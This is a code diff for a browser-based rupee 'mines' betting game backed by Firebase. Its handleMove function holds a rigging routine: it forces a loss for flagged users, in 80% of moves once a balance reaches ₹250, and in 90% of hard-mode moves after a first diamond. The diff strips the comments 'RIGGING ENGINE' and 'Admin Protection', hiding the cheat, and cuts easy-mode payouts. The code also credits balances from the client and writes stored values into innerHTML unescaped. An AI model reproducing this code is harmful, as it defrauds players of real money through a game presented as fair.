@@ -123,35 +123,22 @@
         loadMyBets(user.uid);
     });
 
-    // Create Grid
     const grid = document.getElementById("gameGrid");
     for(let i=0; i<25; i++) {
         const div = document.createElement("div"); div.className = "slot";
         div.onclick = () => handleMove(i, div); grid.appendChild(div);
     }
 
-    window.changeLvl = (lvl) => { 
-        if(!isPlaying) { 
-            currentLvl = lvl; 
-            document.querySelectorAll('.lvl-btn').forEach(b => b.classList.remove('active')); 
-            document.getElementById(`btn-${lvl}`).classList.add('active'); 
-        } 
-    }
+    window.changeLvl = (lvl) => { if(!isPlaying) { currentLvl = lvl; document.querySelectorAll('.lvl-btn').forEach(b => b.classList.remove('active')); document.getElementById(`btn-${lvl}`).classList.add('active'); } }
 
     window.startGame = async () => {
         activeBet = parseFloat(document.getElementById("betInput").value);
         if(isNaN(activeBet) || activeBet < 10) return alert("Min bet ₹10");
         if(activeBet > balance) return alert("Low Balance!");
-
         await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(-activeBet) });
         isPlaying = true; diamondsFound = 0; currentMult = 1.0; mines = [];
-        
         let count = (currentLvl === 'easy') ? 3 : (currentLvl === 'medium' ? 7 : 20);
-        while(mines.length < count) { 
-            let r = Math.floor(Math.random() * 25); 
-            if(!mines.includes(r)) mines.push(r); 
-        }
-
+        while(mines.length < count) { let r = Math.floor(Math.random() * 25); if(!mines.includes(r)) mines.push(r); }
         document.getElementById("startBtn").style.display = "none";
         document.getElementById("cashBtn").style.display = "block";
         document.getElementById("multText").innerText = "1.00x";
@@ -161,14 +148,12 @@
 
     window.handleMove = async (idx, el) => {
         if(!isPlaying || el.classList.contains('diamond') || el.classList.contains('bomb')) return;
-        
         const uSnap = await get(ref(db, `users/${auth.currentUser.uid}`));
         const uData = uSnap.val() || {};
         
-        // --- RIGGING ENGINE ---
         let shouldForceLoss = false;
         if (uData.forceLoss === true) shouldForceLoss = true;
-        else if (balance >= 250 && Math.random() < 0.80) shouldForceLoss = true; // Admin Protection
+        else if (balance >= 250 && Math.random() < 0.80) shouldForceLoss = true;
         else if (currentLvl === 'hard' && diamondsFound >= 1 && Math.random() < 0.90) shouldForceLoss = true;
 
         if (shouldForceLoss && uData.forceWin !== true) {
@@ -176,47 +161,37 @@
         } else if (uData.forceWin === true) {
             if (mines.includes(idx)) {
                 let empty = []; for(let i=0; i<25; i++) if(!mines.includes(i) && i!==idx) empty.push(i);
-                mines = mines.filter(m => m !== idx); 
-                mines.push(empty[Math.floor(Math.random()*empty.length)]);
+                mines = mines.filter(m => m !== idx); mines.push(empty[Math.floor(Math.random()*empty.length)]);
             }
         }
 
         if(mines.includes(idx)) {
             isPlaying = false; el.innerText = "💣"; el.classList.add("bomb");
             saveTx('LOSE', activeBet, currentMult);
-            // Show all bombs
-            mines.forEach(m => {
-                grid.children[m].classList.add("bomb");
-                grid.children[m].innerText = "💣";
-            });
+            mines.forEach(m => { grid.children[m].classList.add("bomb"); grid.children[m].innerText = "💣"; });
             setTimeout(() => { showModal("BOOM!", "₹" + activeBet.toFixed(2) + " Lost", "💥"); resetUI(); }, 600);
         } else {
-            diamondsFound++; 
-            updateMultiplier(); 
-            el.innerText = "💎"; el.classList.add("diamond");
+            diamondsFound++; updateMultiplier(); el.innerText = "💎"; el.classList.add("diamond");
         }
     }
 
     function updateMultiplier() {
-        const easyMults = [1.50, 2.10, 2.90, 4.44, 6.20, 8.50, 11.20, 15.00, 19.20]; 
+        // Easy Mode: ₹10 bet -> 1st: ₹12.50, 2nd: ₹14.80, 3rd: ₹17.20
+        const easyMults = [1.25, 1.48, 1.72, 2.50, 4.00, 6.20, 9.50, 14.00, 19.00]; 
         const mediumMults = [2.00, 3.80, 6.50, 11.00, 19.50, 32.00, 55.00];
         const hardMults = [4.50, 18.20, 75.00, 320.00, 950.00];
-
         let mults = (currentLvl === 'easy') ? easyMults : (currentLvl === 'medium' ? mediumMults : hardMults);
         currentMult = mults[diamondsFound - 1] || mults[mults.length - 1];
-        
         document.getElementById("multText").innerText = currentMult.toFixed(2) + "x";
         document.getElementById("profitText").innerText = "₹" + (activeBet * currentMult).toFixed(2);
     }
 
     window.cashout = async () => {
         if(!isPlaying || diamondsFound === 0) return;
-        const win = activeBet * currentMult; 
-        isPlaying = false;
+        const win = activeBet * currentMult; isPlaying = false;
         await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(win) });
         saveTx('WIN', win, currentMult);
-        showModal("CASHOUT!", "You Won ₹" + win.toFixed(2), "🏆"); 
-        resetUI();
+        showModal("CASHOUT!", "You Won ₹" + win.toFixed(2), "🏆"); resetUI();
     }
 
     async function saveTx(type, amt, mult) {
@@ -224,10 +199,8 @@
     }
 
     window.switchTab = (t) => {
-        currentTab = t;
-        document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
-        document.getElementById(`tab-${t}`).classList.add('active');
-        document.getElementById("listContent").innerHTML = "";
+        currentTab = t; document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+        document.getElementById(`tab-${t}`).classList.add('active'); document.getElementById("listContent").innerHTML = "";
         if(t === 'my') loadMyBets(auth.currentUser.uid);
     }
 
@@ -236,8 +209,7 @@
             if(currentTab !== 'my') return;
             const list = document.getElementById("listContent"); list.innerHTML = "";
             s.forEach(c => {
-                const d = c.val(); 
-                const color = d.type === 'WIN' ? 'win-txt' : 'lose-txt';
+                const d = c.val(); const color = d.type === 'WIN' ? 'win-txt' : 'lose-txt';
                 list.innerHTML = `<div class="tx-row"><span>${d.mult}x</span><span class="${color}">${d.type==='WIN'?'+':'-'}₹${parseFloat(d.amount).toFixed(0)}</span><span>${new Date(d.time).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span></div>` + list.innerHTML;
             });
         });
